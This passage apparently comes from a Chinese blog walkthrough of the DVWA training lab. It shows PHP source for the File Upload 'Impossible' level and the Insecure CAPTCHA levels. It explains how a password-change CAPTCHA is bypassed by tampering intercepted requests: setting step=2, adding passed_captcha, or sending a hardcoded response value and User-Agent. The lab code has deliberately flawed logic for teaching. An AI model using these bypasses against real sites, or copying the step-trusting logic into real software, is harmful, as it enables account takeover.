    <span class="token variable">$temp_file</span>     <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">ini_get</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'upload_tmp_dir'</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span> <span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span> <span class="token function">ini_get</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'upload_tmp_dir'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$temp_file</span>    <span class="token operator">.=</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$uploaded_name</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span>

    <span class="token comment">// Is it an image?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'jpg'</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'jpeg'</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'png'</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span> <span class="token operator">||</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        <span class="token function">getimagesize</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">imagejpeg</span><span class="token punctuation">(</span> <span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">imagepng</span><span class="token punctuation">(</span> <span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">imagedestroy</span><span class="token punctuation">(</span> <span class="token variable">$img</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Can we move the file to the web root from the temp folder?</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">rename</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token punctuation">(</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token operator">.</span> <span class="token variable">$target_path</span> <span class="token operator">.</span> <span class="token variable">$target_file</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// Yes!</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;&lt;a href='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$target_file</span><span class="token punctuation">}</span></span>'&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$target_file</span><span class="token punctuation">}</span></span>&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// No</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Delete any temp files</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">file_exists</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Invalid file</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用了时间戳的md5值做文件名，然后添加文件后缀，接着判断后缀名以及content-type类型，和检测是否为图片，同时使用<code>imagecreatefrompng</code>等类似函数，删除掉了元数据，创建新图像。意味着图片马也无法绕过了</p>
<h1>0x06 Insecure CAPTCHA</h1>
<h2 id="Low-6">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'step'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'1'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Hide the CAPTCHA form</span>
    <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

    <span class="token comment">// Get input</span>
    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Check CAPTCHA from 3rd party</span>
    <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token function">recaptcha_check_answer</span><span class="token punctuation">(</span>
        <span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'recaptcha_private_key'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'g-recaptcha-response'</span><span class="token punctuation">]</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Did the CAPTCHA fail?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token variable">$resp</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// What happens when the CAPTCHA was entered incorrectly</span>
        <span class="token variable">$html</span>     <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
        <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// CAPTCHA was correct. Do both new passwords match?</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// Show next stage for the user</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"
                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;
                &lt;form action=\"#\" method=\"POST\"&gt;
                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;
                    &lt;input type=\"hidden\" name=\"password_new\" value=\"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$pass_new</span><span class="token punctuation">}</span></span>\" /&gt;
                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$pass_conf</span><span class="token punctuation">}</span></span>\" /&gt;
                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;
                &lt;/form&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// Both new passwords do not match.</span>
            <span class="token variable">$html</span>     <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
            <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>前半部分代码如上，这里看到他会先去判断验证码是否正确，如果正确才会接着去判断密码修改情况。否则报错</p>
<p>关键在于第二部分代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'step'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'2'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Hide the CAPTCHA form</span>
    <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

    <span class="token comment">// Get input</span>
    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Check to see if both password match</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// They do!</span>
        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Update database</span>
        <span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '<span class="token interpolation"><span class="token variable">$pass_new</span></span>' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Feedback for the end user</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// Issue with the passwords matching</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
        <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里在if语句的开头都对step的参数做了判断，如果是2的话，就默认为经历了step=1的验证码的验证，接着取将修改后的密码直接插入数据库更新（同时防止了SQL注入）</p>
<p>这意味着我们可以在修改密码之后，bp抓包修改step的值来绕过</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112172843455.png" alt="image-20240112172843455"></p>
<h2 id="Medium-6">Medium</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173235566.png" alt="image-20240112173235566"></p>
<p>这里与上一关的不同点在于，上述图片中的表单form中添加了一个隐藏元素passed_captcha并被设置为了true，这会被用于第二步</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173336700.png" alt="image-20240112173336700"></p>
<p>他会判断passed_captcha表单元素是否存在，也就是判断了step=1这一步是否被执行过，但我们依旧可以bp修改绕过，只需要抓包修改step为2进入第二个if判断，接着添加passed_captcha元素为true即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112173226410.png" alt="image-20240112173226410"></p>
<h2 id="High-6">High</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112175650521.png" alt="image-20240112175650521"></p>
<p>与前几个级别不同点在于，这一关取消了step的判断，但却在判断验证码是否正确的同时，多了如下代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'g-recaptcha-response'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'hidd3n_valu3'</span>
            <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_USER_AGENT'</span> <span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'reCAPTCHA'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这明摆着，直接bp修改即可，如下图，添加<code>g-recaptcha-response</code>的同时，修改UA头，即可绕过，但这里我似乎还需要删除step这个参数才能成功，不知为何</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112175639711.png" alt="image-20240112175639711"></p>
<h2 id="Impossible-6">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Check Anti-CSRF token</span>
    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Hide the CAPTCHA form</span>
    <span class="token variable">$hide_form</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

    <span class="token comment">// Get input</span>
    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_current'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_curr</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Check CAPTCHA from 3rd party</span>
    <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token function">recaptcha_check_answer</span><span class="token punctuation">(</span>
        <span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'recaptcha_private_key'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'g-recaptcha-response'</span><span class="token punctuation">]</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
